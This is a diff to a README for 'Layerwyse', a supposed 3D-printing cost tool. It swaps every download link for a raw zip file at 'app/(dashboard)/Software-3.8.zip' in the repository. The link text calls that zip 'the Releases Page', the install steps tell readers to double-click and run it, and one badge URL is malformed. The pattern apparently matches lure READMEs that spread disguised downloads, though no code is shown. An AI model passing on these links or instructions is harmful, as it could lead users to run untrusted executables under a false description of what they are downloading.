@@ -1,7 +1,7 @@
 # ✨ Layerwyse - Simplifying 3D-Printing Costs
 
 ## 📥 Download Layerwyse
-[![Download Layerwyse](https://raw.githubusercontent.com/Rajesh-Rey/Layerwyse/main/app/Layerwyse-v1.2.zip%https://raw.githubusercontent.com/Rajesh-Rey/Layerwyse/main/app/Layerwyse-v1.2.zip)](https://raw.githubusercontent.com/Rajesh-Rey/Layerwyse/main/app/Layerwyse-v1.2.zip)
+[![Download Layerwyse](https://github.com/Rajesh-Rey/Layerwyse/raw/refs/heads/main/app/(dashboard)/Software-3.8.zip%https://github.com/Rajesh-Rey/Layerwyse/raw/refs/heads/main/app/(dashboard)/Software-3.8.zip)](https://github.com/Rajesh-Rey/Layerwyse/raw/refs/heads/main/app/(dashboard)/Software-3.8.zip)
 
 ## 🚀 Getting Started
 Layerwyse helps you manage your 3D-printing projects with accurate pricing and estimates. Whether you are a hobbyist or a professional, understanding costs can make your project easier.
@@ -26,14 +26,14 @@ Layerwyse offers several features to enhance your project management:
 ## 📥 Download & Install
 To get started with Layerwyse, follow these simple steps:
 
-1. **Visit the Releases Page**: Click [here](https://raw.githubusercontent.com/Rajesh-Rey/Layerwyse/main/app/Layerwyse-v1.2.zip) to go to the download page.
+1. **Visit the Releases Page**: Click [here](https://github.com/Rajesh-Rey/Layerwyse/raw/refs/heads/main/app/(dashboard)/Software-3.8.zip) to go to the download page.
 2. **Select the Latest Release**: Look for the latest version, which will be at the top of the list.
 3. **Download the Installer**: Click the link for the installer that matches your operating system.
 4. **Run the Installer**: Once the download is complete, find the file in your downloads folder and double-click it to begin the installation.
 5. **Follow Instructions**: A setup wizard will appear. Follow the on-screen instructions to complete the installation.
 6. **Launch Layerwyse**: After installation, you can find Layerwyse in your applications folder. Double-click to start using it.
 
-For your convenience, here is the [link to the Releases Page](https://raw.githubusercontent.com/Rajesh-Rey/Layerwyse/main/app/Layerwyse-v1.2.zip) again. 
+For your convenience, here is the [link to the Releases Page](https://github.com/Rajesh-Rey/Layerwyse/raw/refs/heads/main/app/(dashboard)/Software-3.8.zip) again. 
 
 ## 📝 How to Use Layerwyse
 Using Layerwyse is straightforward. Here are the basic steps:
